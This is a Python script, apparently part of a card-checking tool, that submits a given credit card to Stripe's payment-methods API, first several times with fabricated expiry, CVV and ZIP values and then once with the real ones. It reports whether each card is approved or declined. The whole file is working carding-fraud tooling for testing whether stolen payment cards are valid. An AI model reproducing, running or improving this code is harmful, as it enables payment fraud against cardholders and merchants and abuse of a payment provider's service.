#!/usr/bin/env python3
import time
import requests

from _common import cli_args, parse_cc, fake_creds, emit, log

STRIPE_KEY = "sk_test_yourKeyHere"
URL = "https://api.stripe.com/v1/payment_methods"


def attempt(number, mm, yy, cvv, zip_code):
    try:
        r = requests.post(
            URL,
            headers={"Authorization": f"Bearer {STRIPE_KEY}"},
            data={
                "type": "card",
                "card[number]": number,
                "card[exp_month]": mm,
                "card[exp_year]": yy,
                "card[cvc]": cvv,
                "billing_details[address][postal_code]": zip_code,
            },
            timeout=12,
        )
        j = r.json()
        if r.status_code == 200 and "id" in j:
            return "approved", j.get("id", "")
        err = j.get("error", {})
        return "declined", (err.get("code") or err.get("message", ""))[:200]
    except requests.Timeout:
        return "timeout", "request timeout"
    except Exception as e:
        return "error", str(e)[:200]


def main():
    args = cli_args()
    cc = parse_cc(args.cc)
    if not cc:
        return emit("stripe", "error", 0, 0, "bad cc format")
    start = time.time()
    n = 0
    for _ in range(args.rounds):
        f = fake_creds(cc)
        s, _ = attempt(cc["number"], f["mm"], f["yy"], f["cvv"], f["zip"])
        n += 1
        log(f"[stripe] fake #{n}: {s}")
    status, raw = attempt(cc["number"], cc["mm"], cc["yy"], cc["cvv"], args.zip)
    n += 1
    log(f"[stripe] real #{n}: {status} {raw}")
    emit("stripe", status, n, time.time() - start, raw)


if __name__ == "__main__":
    main()
